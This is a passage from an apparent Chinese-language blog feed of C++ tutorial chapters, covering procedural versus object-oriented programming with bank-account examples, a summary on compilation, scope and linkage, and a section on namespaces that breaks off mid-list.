        <content type="html"><![CDATA[<p>在深入学习C++的类之前，了解两种主要的编程范式（Programming Paradigms）——过程性编程和面向对象编程——之间的区别是很有帮助的。C++ 语言同时支持这两种范式，但其强大的面向对象特性是其核心优势之一。</p><h2 id="过程性编程-Procedural-Programming"><a href="#过程性编程-Procedural-Programming" class="headerlink" title="过程性编程 (Procedural Programming)"></a>过程性编程 (Procedural Programming)</h2><p>过程性编程是最早期的编程范式之一，像C语言就是典型的过程性语言。它的核心思想是将程序看作是一系列要执行的<strong>过程</strong>或<strong>函数</strong>。</p><ul><li>  <strong>关注点：</strong> 主要关注点在于<strong>算法</strong>和<strong>执行步骤</strong>。程序被分解为一系列的函数调用。</li><li>  <strong>数据处理：</strong> 数据通常是独立于函数存在的（例如全局变量），或者作为参数在函数之间传递。数据和操作数据的函数是分离的。</li><li>  <strong>组织方式：</strong> 程序通过函数的层次结构来组织。一个主函数调用其他函数，这些函数又可能调用更底层的函数。</li><li>  <strong>示例语言：</strong> C, Pascal, Fortran。</li></ul><p><strong>过程性编程的思维方式：</strong> “程序需要执行哪些步骤？需要哪些函数来实现这些步骤？”</p><p><strong>例子（概念性）：</strong><br>假设要管理一个银行账户。在过程性方法中，你可能会有：</p><ul><li>  一个数据结构（比如 <code>struct</code>）来存储账户信息（账号、余额）。</li><li>  一系列函数来操作这个数据结构：<code>deposit(account, amount)</code>, <code>withdraw(account, amount)</code>, <code>check_balance(account)</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C 语言示例 (过程性)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BankAccount</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> accountNumber;</span><br><span class="line">    <span class="keyword">double</span> balance;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deposit</span><span class="params">(struct BankAccount* acc, <span class="keyword">double</span> amount)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        acc-&gt;balance += amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">withdraw</span><span class="params">(struct BankAccount* acc, <span class="keyword">double</span> amount)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (amount &gt; <span class="number">0</span> &amp;&amp; acc-&gt;balance &gt;= amount) &#123;</span><br><span class="line">        acc-&gt;balance -= amount;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 处理错误</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> check_balance(struct BankAccount* acc) &#123;</span><br><span class="line">    <span class="keyword">return</span> acc-&gt;balance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BankAccount</span> <span class="title">myAccount</span> =</span> &#123;<span class="number">12345</span>, <span class="number">1000.0</span>&#125;;</span><br><span class="line">    deposit(&amp;myAccount, <span class="number">500.0</span>);</span><br><span class="line">    withdraw(&amp;myAccount, <span class="number">200.0</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这种模式下，数据（<code>myAccount</code>）和操作（<code>deposit</code>, <code>withdraw</code>）是分开定义的。</p><h2 id="面向对象编程-Object-Oriented-Programming-OOP"><a href="#面向对象编程-Object-Oriented-Programming-OOP" class="headerlink" title="面向对象编程 (Object-Oriented Programming - OOP)"></a>面向对象编程 (Object-Oriented Programming - OOP)</h2><p>面向对象编程（OOP）是一种不同的思考方式。它将程序看作是由相互交互的<strong>对象 (Objects)</strong> 组成的。</p><ul><li>  <strong>关注点：</strong> 主要关注点在于<strong>数据</strong>以及与数据相关的<strong>操作</strong>。程序的核心是对象。</li><li>  <strong>对象：</strong> 对象是现实世界实体的抽象，它<strong>封装 (Encapsulates)</strong> 了<strong>数据（属性/状态）</strong>和可以对这些数据执行的<strong>操作（方法/行为）</strong>。</li><li>  <strong>组织方式：</strong> 程序通过创建对象并让这些对象相互发送消息（调用方法）来组织。</li><li><strong>核心概念：</strong><ul><li>  <strong>封装 (Encapsulation):</strong> 将数据和操作数据的函数捆绑在一起（形成类），并对外部隐藏对象的内部实现细节（数据隐藏）。</li><li>  <strong>继承 (Inheritance):</strong> 允许创建一个新类（派生类），该类继承现有类（基类）的属性和方法，从而实现代码重用和层次结构。</li><li>  <strong>多态 (Polymorphism):</strong> 允许不同类的对象对相同的消息（方法调用）做出不同的响应。这通常通过虚函数实现。</li><li>  <strong>抽象 (Abstraction):</strong> 关注对象的本质特征，忽略不重要的细节。类就是一种抽象。</li></ul></li><li>  <strong>示例语言：</strong> C++, Java, C#, Python, Smalltalk。</li></ul><p><strong>面向对象编程的思维方式：</strong> “程序涉及哪些‘事物’（对象）？每个‘事物’有哪些特征（数据）？它可以做什么（方法）？这些‘事物’之间如何交互？”</p><p><strong>例子（概念性）：</strong><br>对于银行账户，OOP方法会创建一个 <code>BankAccount</code> <strong>类</strong>：</p><ul><li>  <strong>数据成员（属性）：</strong> <code>accountNumber</code>, <code>balance</code> (通常设为私有 <code>private</code>，以实现数据隐藏)。</li><li>  <strong>成员函数（方法）：</strong> <code>deposit(amount)</code>, <code>withdraw(amount)</code>, <code>check_balance()</code> (这些函数直接操作对象内部的数据)。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ 示例 (面向对象)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BankAccount</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>: <span class="comment">// 数据隐藏</span></span><br><span class="line">    <span class="keyword">int</span> accountNumber;</span><br><span class="line">    <span class="keyword">double</span> balance;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>: <span class="comment">// 公共接口</span></span><br><span class="line">    <span class="comment">// 构造函数 (用于创建对象)</span></span><br><span class="line">    BankAccount(<span class="keyword">int</span> accNum, <span class="keyword">double</span> initialBalance) &#123;</span><br><span class="line">        accountNumber = accNum;</span><br><span class="line">        balance = (initialBalance &gt;= <span class="number">0</span>) ? initialBalance : <span class="number">0.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deposit</span><span class="params">(<span class="keyword">double</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            balance += amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">withdraw</span><span class="params">(<span class="keyword">double</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (amount &gt; <span class="number">0</span> &amp;&amp; balance &gt;= amount) &#123;</span><br><span class="line">            balance -= amount;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 处理错误</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> check_balance() <span class="keyword">const</span> &#123; <span class="comment">// const 表示此方法不修改对象状态</span></span><br><span class="line">        <span class="keyword">return</span> balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getAccountNumber</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> accountNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;; <span class="comment">// 注意类定义末尾的分号</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建 BankAccount 对象</span></span><br><span class="line">    <span class="function">BankAccount <span class="title">myAccount</span><span class="params">(<span class="number">12345</span>, <span class="number">1000.0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过对象调用方法</span></span><br><span class="line">    myAccount.deposit(<span class="number">500.0</span>);</span><br><span class="line">    myAccount.withdraw(<span class="number">200.0</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Balance: &quot;</span> &lt;&lt; myAccount.check_balance() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，数据 (<code>accountNumber</code>, <code>balance</code>) 和操作 (<code>deposit</code>, <code>withdraw</code>, <code>check_balance</code>) 被紧密地捆绑在 <code>BankAccount</code> 类中。你通过 <code>myAccount</code> 这个对象来调用它的方法。</p><h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table><thead><tr><th align="left">特性</th><th align="left">过程性编程</th><th align="left">面向对象编程 (OOP)</th></tr></thead><tbody><tr><td align="left"><strong>核心</strong></td><td align="left">函数/过程</td><td align="left">对象 (数据 + 方法)</td></tr><tr><td align="left"><strong>数据</strong></td><td align="left">通常与函数分离</td><td align="left">封装在对象内部</td></tr><tr><td align="left"><strong>访问控制</strong></td><td align="left">有限 (主要靠作用域)</td><td align="left">强 (public, private, protected)</td></tr><tr><td align="left"><strong>主要优势</strong></td><td align="left">简单直接，适合小型或中型项目</td><td align="left">模块化、重用性、可维护性、扩展性好</td></tr><tr><td align="left"><strong>设计方法</strong></td><td align="left">自顶向下 (Top-down)</td><td align="left">自底向上 (Bottom-up) 或混合</td></tr><tr><td align="left"><strong>代码重用</strong></td><td align="left">主要通过函数库</td><td align="left">主要通过继承和组合</td></tr><tr><td align="left"><strong>适合场景</strong></td><td align="left">算法密集型、顺序执行任务</td><td align="left">大型复杂系统、模拟、GUI</td></tr></tbody></table><p>C++ 最初是从 C 语言发展而来的，因此它完全兼容过程性编程。然而，C++ 的真正威力在于其强大的面向对象特性，它允许开发者构建更大型、更复杂、更易于维护和扩展的软件系统。接下来的章节将深入探讨 OOP 的核心——类和对象。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9.4 总结</title>
      <link href="2025/04/26/9.4_%E6%80%BB%E7%BB%93/"/>
      <url>2025/04/26/9.4_%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本章探讨了C++如何管理程序中的内存和名称，特别是在涉及多个文件的大型项目中。这些机制对于编写结构清晰、可维护且可扩展的C++代码至关重要。</p><p>主要内容回顾：</p><ol><li><p> <strong>单独编译 (Separate Compilation):</strong> C++允许将程序分解为多个源文件（<code>.cpp</code>）和头文件（<code>.h</code> 或 <code>.hpp</code>）。源文件包含函数的具体实现或变量的定义，而头文件通常包含声明（如函数原型、类定义、常量声明、模板等）。每个源文件可以被独立编译成目标文件（<code>.obj</code> 或 <code>.o</code>），最后由链接器将这些目标文件以及所需的库文件组合成最终的可执行程序。这种方式提高了编译效率，并使得代码模块化和重用更加方便。</p></li><li><p><strong>存储持续性、作用域和链接性 (Storage Duration, Scope, and Linkage):</strong></p><ul><li>  <strong>存储持续性</strong>决定了变量或对象在内存中存在的时间。主要有：自动存储（函数内定义的局部变量，随函数调用创建和销毁）、静态存储（程序运行期间一直存在，如全局变量或用 <code>static</code> 修饰的变量）、线程存储（C++11引入，与特定线程生命周期相关）和动态存储（使用 <code>new</code> 分配，<code>delete</code> 释放）。</li><li>  <strong>作用域</strong>定义了程序中可以访问一个名称（变量、函数等）的区域。主要有：块作用域（<code>&#123;&#125;</code>内部）、函数作用域（仅用于 <code>goto</code> 标签）、函数原型作用域（仅用于参数名）、文件作用域（全局作用域）和类作用域。</li><li>  <strong>链接性</strong>决定了在不同文件或编译单元中声明的同名标识符是否指向同一个实体。主要有：外部链接（可在多个文件中共享，如普通全局变量和函数）、内部链接（仅在当前文件内可见，如用 <code>static</code> 修饰的全局变量/函数或未命名空间中的成员）和无链接（如局部变量）。<code>extern</code> 关键字可用于引用其他文件中具有外部链接的变量。</li></ul></li><li><p><strong>名称空间 (Namespaces):</strong> 为了解决大型项目中可能出现的名称冲突问题（例如，不同库定义了同名的函数或类），C++引入了名称空间。</p><ul><li>  使用 <code>namespace</code> 关键字可以创建具名的代码区域。</li><li>  访问名称空间成员可以通过作用域解析运算符 <code>::</code>（如 <code>std::cout</code>）、<code>using</code> 声明（如 <code>using std::cout;</code>）或 <code>using</code> 指令（如 <code>using namespace std;</code>）。</li><li>  C++标准库的所有功能都位于 <code>std</code> 名称空间中。</li><li>  未命名的名称空间提供了一种创建具有内部链接性的实体的方法，是替代文件作用域 <code>static</code> 的现代方式。</li></ul></li></ol><p>掌握这些概念有助于更好地组织代码，理解变量和函数的生命周期与可见性，并有效避免名称冲突，从而构建更健壮、更模块化的C++应用程序。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>9.3 名称空间</title>
      <link href="2025/04/26/9.3_%E5%90%8D%E7%A7%B0%E7%A9%BA%E9%97%B4/"/>
      <url>2025/04/26/9.3_%E5%90%8D%E7%A7%B0%E7%A9%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<p>随着项目越来越大，或者当你需要使用来自不同开发者的代码库时，可能会遇到一个问题：名称冲突。例如，你可能定义了一个名为 <code>List</code> 的类，而另一个库也定义了一个同名的 <code>List</code> 类。当你在同一个程序中使用这两个类时，编译器就无法区分你指的是哪个 <code>List</code>。</p><p>为了解决这个问题，C++引入了<strong>名称空间 (Namespace)</strong> 的概念。名称空间提供了一种将全局作用域划分为不同逻辑部分的方法，每个部分包含一组相关的名称（如变量、函数、类等）。</p><h2 id="9-3-1-传统的C-名称空间"><a href="#9-3-1-传统的C-名称空间" class="headerlink" title="9.3.1 传统的C++名称空间"></a>9.3.1 传统的C++名称空间</h2><p>在名称空间特性被引入之前，C++只有一个**全局名称空间 (Global Namespace)**。所有在任何函数、类或结构外部声明的名称都属于全局名称空间。大型项目中，这很容易导致名称冲突，特别是当包含多个第三方库时。</p><p>开发者有时会使用一些约定来模拟名称空间，例如给所有相关的名称添加特定的前缀（如 <code>mylib_List</code>），但这并不是一个完美的解决方案。</p><h2 id="9-3-2-新的名称空间特性"><a href="#9-3-2-新的名称空间特性" class="headerlink" title="9.3.2 新的名称空间特性"></a>9.3.2 新的名称空间特性</h2><p>C++标准引入了 <code>namespace</code> 关键字来显式地创建具名的名称空间。</p><p><strong>定义名称空间:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> mycode &#123;</span><br><span class="line">    <span class="comment">// 在这里声明和定义变量、函数、类等</span></span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value: &quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125; <span class="comment">// namespace mycode</span></span><br></pre></td></tr></table></figure><p><strong>访问名称空间成员:</strong></p><p>有三种主要方法可以访问名称空间中的成员：</p><ol><li><p><strong>作用域解析运算符 <code>::</code> (Scope Resolution Operator):</strong> 使用名称空间名称和 <code>::</code> 来限定成员名。这是最安全的方式，因为它明确指出了使用的是哪个名称空间的成员。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mycode &#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; mycode::value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>using</code> 声明 (Using Declaration):</strong> 使特定的名称空间成员可用，就像它是在当前作用域声明的一样。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mycode &#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> score = <span class="number">9.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> mycode::value; <span class="comment">// 只让 value 可用</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 输出 10 (直接访问)</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; score &lt;&lt; std::endl; // 错误！score 未声明</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; mycode::score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 需要限定符</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>using</code> 指令 (Using Directive):</strong> 使整个名称空间的所有成员都可用。这比较方便，但也可能重新引入名称冲突的问题，应谨慎使用，尤其是在头文件中。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mycode &#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> score = <span class="number">9.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 using 指令使 mycode 的所有成员可用</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> mycode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 10 (直接访问)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 9.5 (直接访问)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong><code>std</code> 名称空间:</strong></p><p>C++标准库的所有组件（如 <code>cout</code>, <code>cin</code>, <code>string</code>, <code>vector</code> 等）都被定义在 <code>std</code> 名称空间中。这就是为什么我们通常需要写 <code>std::cout</code> 或者在文件开头使用 <code>using namespace std;</code> 或 <code>using std::cout;</code>。</p><p><strong>未命名的名称空间 (Unnamed Namespaces):</strong></p><p>你也可以创建未命名的名称空间。这类似于使用 <code>static</code> 关键字声明具有内部链接性的全局变量或函数。未命名名称空间中的成员只能在当前文件内访问。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="comment">// 这些成员只在当前文件可见</span></span><br><span class="line">    <span class="keyword">int</span> internal_count = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">increment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        internal_count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在同一文件中可以访问</span></span><br><span class="line"><span class="comment">// increment();</span></span><br><span class="line"><span class="comment">// std::cout &lt;&lt; internal_count &lt;&lt; std::endl;</span></span><br></pre></td></tr></table></figure><h2 id="9-3-3-名称空间示例"><a href="#9-3-3-名称空间示例" class="headerlink" title="9.3.3 名称空间示例"></a>9.3.3 名称空间示例</h2><p>下面是一个更完整的示例，展示了如何定义和使用多个名称空间：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // std 命名空间中的 string 类</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一个名称空间</span></span><br><span class="line"><span class="keyword">namespace</span> first_space &#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside first_space&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二个名称空间</span></span><br><span class="line"><span class="keyword">namespace</span> second_space &#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside second_space&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用作用域解析运算符</span></span><br><span class="line">    first_space::display();  <span class="comment">// 输出: Inside first_space</span></span><br><span class="line">    second_space::display(); <span class="comment">// 输出: Inside second_space</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;first_space::count = &quot;</span> &lt;&lt; first_space::count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 输出: 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;second_space::count = &quot;</span> &lt;&lt; second_space::count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 using 声明</span></span><br><span class="line">    &#123; <span class="comment">// 创建一个新的作用域</span></span><br><span class="line">        <span class="keyword">using</span> first_space::display;</span><br><span class="line">        display(); <span class="comment">// 调用 first_space::display()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 using 指令 (通常建议在函数内部或特定作用域内使用)</span></span><br><span class="line">    &#123; <span class="comment">// 创建一个新的作用域</span></span><br><span class="line">        <span class="keyword">using</span> <span class="keyword">namespace</span> second_space;</span><br><span class="line">        display(); <span class="comment">// 调用 second_space::display()</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;count from second_space = &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 访问 second_space::count</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// std 命名空间的使用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> message = <span class="string">&quot;Hello from std namespace!&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; message &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-3-4-名称空间及其前途"><a href="#9-3-4-名称空间及其前途" class="headerlink" title="9.3.4 名称空间及其前途"></a>9.3.4 名称空间及其前途</h2><p>名称空间是现代C++编程不可或缺的一部分。它们是组织代码、避免名称冲突以及管理大型项目复杂性的关键工具。</p><ul><li>  <strong>库开发:</strong> 